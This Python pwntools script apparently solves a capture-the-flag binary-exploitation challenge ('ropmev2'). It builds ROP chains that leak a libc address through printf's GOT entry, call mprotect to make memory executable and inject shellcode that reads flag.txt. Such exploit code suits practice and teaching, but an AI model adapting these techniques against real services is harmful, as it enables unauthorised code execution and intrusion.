#!/usr/bin/env python3


from pwn import *

BINARY = "./ropmev2"
LIBC = "./libc.so.6"
LD = "./ld-2.27.so"
ADDR = "localhost"
FLAG = "./flag.txt"
PORT = 4444

splash()
elf = context.binary = ELF(BINARY)
libc = ELF(LIBC, checksec=False)
ld = ELF(LD, checksec=False)


class Gadgets:
    main = 0x40116B
    pop_rdi_ret = 0x40142B
    pop_rsi_ret = 0x23e6a
    pop_rdx_ret = 0x1b96
    one_gadget = 0x4f322


class Offsets:
    initial = 0x3ED000


def conn():
    if args.LOCAL:
        pty = process.PTY
        return process(
            [ld.path, elf.path],
            stdin=pty,
            stdout=pty,
            stderr=pty,
            env={"LD_PRELOAD": libc.path},
        )

    else:
        return remote(ADDR, PORT)


def solve():
    io = conn()

    payload = [
        b"\x00",
        cyclic(cyclic_find(0x6161616161616362, n=8), n=8),
        Gadgets.pop_rdi_ret,
        elf.got.printf,
        elf.plt.printf,
        Gadgets.main,
    ]
    io.sendlineafter("Please dont hack me\n", flat(payload))

    printf_leak = u64(io.recvuntil("P")[:-1].ljust(8, b"\x00"))
    log.success(f"printf @: {hex(printf_leak)}")
    libc.address = printf_leak - libc.sym.printf
    log.success(f"libc base addr @: {hex(libc.address)}")
    one_gadget = libc.address + Gadgets.one_gadget
    log.success(f"one_gadget @: {hex(one_gadget)}")

    shellcode = asm(shellcraft.cat(FLAG))
    payload = [
        b"\x00",
        cyclic(cyclic_find(0x6161616161616362, n=8), n=8),
        Gadgets.pop_rdi_ret,
        0,
        libc.address + Gadgets.pop_rsi_ret,
        libc.address + Offsets.initial,
        libc.address + Gadgets.pop_rdx_ret,
        len(shellcode),
        libc.sym.read,
        Gadgets.pop_rdi_ret,
        libc.address + Offsets.initial,
        libc.address + Gadgets.pop_rsi_ret,
        0x1000,
        libc.address + Gadgets.pop_rdx_ret,
        5,
        libc.sym.mprotect,
        libc.address + Offsets.initial,
    ]
    payload.append(b"\x00" * (0x1F3 - len(flat(payload))))
    io.sendlineafter("\n", flat(payload))
    io.send(shellcode)

    io.interactive()


if __name__ == "__main__":
    solve()
